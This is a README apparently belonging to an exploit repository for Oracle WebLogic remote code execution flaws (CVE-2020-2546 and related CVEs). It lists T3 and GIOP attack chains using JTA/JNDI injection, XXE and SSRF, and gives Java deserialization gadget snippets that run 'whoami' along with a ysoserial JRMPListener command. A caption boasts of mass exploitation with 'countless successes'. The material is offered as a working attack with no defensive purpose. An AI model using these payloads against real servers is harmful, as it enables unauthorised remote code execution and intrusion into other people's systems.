Twitter: [@Hktalent3135773](https://twitter.com/Hktalent3135773)
[![Tweet](https://img.shields.io/twitter/url/http/Hktalent3135773.svg?style=social)](https://twitter.com/intent/tweet?original_referer=https%3A%2F%2Fdeveloper.twitter.com%2Fen%2Fdocs%2Ftwitter-for-websites%2Ftweet-button%2Foverview&ref_src=twsrc%5Etfw&text=myhktools%20-%20Automated%20Pentest%20Recon%20Scanner%20%40Hktalent3135773&tw_p=tweetbutton&url=https%3A%2F%2Fgithub.com%2Fhktalent%2Fmyhktools)
[![Follow on Twitter](https://img.shields.io/twitter/follow/Hktalent3135773.svg?style=social&label=Follow)](https://twitter.com/intent/follow?screen_name=Hktalent3135773)

# 1、Weblogic RCE exploit
CVE_2020_2546 CVE-2020-2915 CVE-2020-2801  CVE-2020-2798  CVE-2020-2883 CVE-2020-2884 CVE-2020-2950 WebLogic RCE T3 payload exploit poc python3

# 2、exploit
- GIOP + send bind (CVE-2020-2555、CVE-2019-2888<XXE>、CVE-2019-2888<XXE+SSRF> or others)
- GIOP + send jta (rmi or others)
- GIOP + send jta + SSRF
- T3 + send jta
- T3 + send jta + SSRF
- T3 + send XXE
- T3 + send XXE + SSRF

#### 2.1、rmi server,see
- don't use org.mozilla.classfile.DefiningClassLoader
- don't use java -cp $mtx/../tools/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1099 Jdk7u21 'whoami'
more see:
https://github.com/hktalent/CVE-2020-2551

# 3、code
### 3.1、code1
```
MVEL.compileExpression
MvelExtractor o = new MvelExtractor("xxx;");
		ObjectOutputStream oo = new ObjectOutputStream(System.out); 
		oo.writeObject(o);
		oo.flush();
```

### 3.2、code2
```
public MsgOutput getObject(final String command) throws Exception {
	  String jndiAddress = command;
		JtaTransactionManager jtaTransactionManager = new JtaTransactionManager();
		jtaTransactionManager.setUserTransactionName(jndiAddress);
		MsgOutput remote = Gadgets.createMemoitizedProxy(Gadgets.createMap("pwned", jtaTransactionManager), MsgOutput.class);
    return remote;
  }
```

### 3.3、code3
```
public IORDelegate getObject(final String command) throws Exception {
IORDelegate ior = Gadgets.createMemoitizedProxy(Gadgets.createMap("pwned", new Jdk7u21().getObject("whoami")), IORDelegate.class);
    return ior;
  }
```

### 3.4、code4
```
weblogic.iiop.IIOPRemoteRefd,ObjectMessageImpl
```

# 4、CVE-2020-2546 payload
#### 批量一波，成功无数
<img width="815" alt="image" src="https://user-images.githubusercontent.com/18223385/80388926-0cac7480-88dd-11ea-9531-cadcc688c8a3.png">

<img width="621" alt="image" src="https://user-images.githubusercontent.com/18223385/75693161-8c550300-5ce1-11ea-9c28-3e81a6c72d28.png">


# 5、thanks for
@[r4v3zn](https://github.com/r4v3zn)
@[0nise](https://github.com/0nise)
